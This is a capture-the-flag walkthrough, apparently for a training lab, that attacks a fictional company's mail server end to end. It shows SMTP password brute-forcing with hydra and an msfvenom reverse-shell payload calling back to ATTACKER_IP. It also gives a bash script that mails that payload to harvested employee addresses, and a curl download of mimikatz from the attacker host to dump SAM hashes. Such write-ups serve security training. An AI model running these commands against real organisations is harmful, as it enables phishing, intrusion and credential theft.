# Scenario

You are a penetration tester who has recently been requested to perform a security assessment for Brik. You are permitted to perform active assessments on `MACHINE_IP` and strictly passive reconnaissance on `brownbrick.co`. The scope includes only the domain and IP provided and does not include other TLDs.

To begin, start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection. Please allow 3-4 minutes for the VM to fully boot up.

***

# Enumeration

## \[+] 10.10.14.36

For this lab, the domain `brownbrick.co` is a live website. For this reason, we can skip adding the IP address and domain to our `/etc/hosts/` file.

Let's start by using `export` so we can assign the IP address to the environment variable `RHOSTS` so we can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.14.36
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] brownbrick.co

### \[-] brownbrick.co/menu.html

Our first objective is to find e-mail addresses for our phishing campaign. We can start by visiting the company's website and clicking on the "Our Team" link:

![444e57e591eda1274cb2ad7e8fa2748a.png](/resources/868a20c2e852458794b8bb48aa274f0e.png)

Scrolling down the page gives us 6 employee e-mail addresses:

![6ff1bd698809220d33cafae9330c7559.png](/resources/fe53fb2530634362b6e23ce5dfd49d3a.png)

Let's save these to a new text file named `emails.txt`:

```plaintext
oaurelius@brownbrick.co
wrohit@brownbrick.co
lhedvig@brownbrick.co
tchikondi@brownbrick.co
pcathrine@brownbrick.co
fstamatis@brownbrick.co
```

Next, we'll build a wordlist using the [cewl](https://github.com/digininja/CeWL) tool which will create a wordlist based on the text on the company's website. The `--lowercase` option will make all the word lowercase and then saves them to a text file named `passwords.txt`:

```plaintext
cewl --lowercase https://brownbrick.co/ > passwords.txt
```

# Initial Foothold

## \[+] Port 587 - SMTP

### \[-] brick-mail\wrohit

Now that we have a list of e-mails and possible passwords, we can try brute forcing an account on the SMTP e-mail server.

```plaintext
hydra -L emails.txt -P passwords.txt 10.10.14.36 smtp -s 587 -t 16
```

After some time, we will find the password for the account `lhedvig@brownbrick.co`:

![242199bc898fde31312a30b23e96dfc2.png](/resources/eb475a6fa43c4fa88d96cd7f1d01a869.png)

With this e-mail account, we can try to phish the other employees of the company using a backdoor and the e-mail list we created earlier.

First, we'll create our backdoor using `msfvenom` and since our Nmap scan revealed a lot of Microsoft services, we can assume that the company is using Windows machines:

```plaintext
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe
```

We can use the following bash script to send e-mails with the `shell.exe` attachment to all the addresses in the `emails.txt` file using the `lhedvig@brownbrick.co` e-mail with the `sendemail` command:

```sh
#!/bin/bash

# Define the common arguments
FROM="lhedvig@brownbrick.co"
SUBJECT="test"
MESSAGE="test"
ATTACHMENT="shell.exe"
SMTP_SERVER="10.10.14.36:25"
USERNAME="lhedvig@brownbrick.co"
PASSWORD="<REDACTED>"

# Read the email addresses from the file and send email
while IFS= read -r email; do
  sendemail -f "$FROM" -t "$email" -u "$SUBJECT" -m "$MESSAGE" -a "$ATTACHMENT" -s "$SMTP_SERVER" -xu "$USERNAME" -xp "$PASSWORD"
done < emails.txt
```

Before running the script, we'll start our Netcat listener on port 4444:

```plaintext
nc -nvlp 4444
```

Then run the script to send the e-mails:

```plaintext
sh script.sh
```

![7a2939673917560c1c8977cdc85e5dda.png](/resources/a216d9176bee4d369f3e76358f54d198.png)

After a moment, we'll have a connection back to our listener on port 4444:

![77e0d12d20b5c19ad0a9e1367e5ecbad.png](/resources/0939ee66a48744ed8003d7135a237b42.png)

We can find the user flag in `C:\Users\wrohit\Desktop\flag.txt`:

![1231a37a569b149ed4f8dce87a39b78f.png](/resources/c3f9f5f4dee24718af35d387f5b477fd.png)

To get the password for the user `wrohit`, we will use [mimikatz](https://github.com/gentilkiwi/mimikatz) to dump the NTLM hashes of the passwords and decrypt the hash.

After downloading mimikatz on the attacking machine, host the file using `python3`:

```plaintext
python3 -m http.server 8888
```

Then on the victim machine, run `curl` to download the file and save it using `-o <FILENAME>`:

```plaintext
curl http://<ATTACKER_IP>/mimikatz.exe -o mimikatz.exe
```

When the file transfer is finished, we can run the following command to dump the local Security Account Manager hashes:

```plaintext
.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
```

![d4cf5fc60bbec1b17cded1259bbbbb14.png](/resources/3b0b0a4f96da4259a618d7bbc44c91cf.png)

To decrypt the hash, we'll use [CrackStation](https://crackstation.net/) which is a database of known hashes and their plaintext:

![fbd755a7fa324cf128bb24a2b332b63c.png](/resources/aa4cf0e7031d4c1e8e9af53421034298.png)

The last task we need to do is to find the password for the hMailServer Administrator dashboard. We can find the configuration file that has the hashed password in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI`:

![afafddfa83a49a32c964e130ca4d9509.png](/resources/437e6d54e92743bf827896651f07919c.png)

To find the plaintext, we'll utilize CrackStation again:

![95569c1f4562c6b2ed5f0859f11f725e.png](/resources/054889a31e7743e5abf1c893f0b10a68.png)
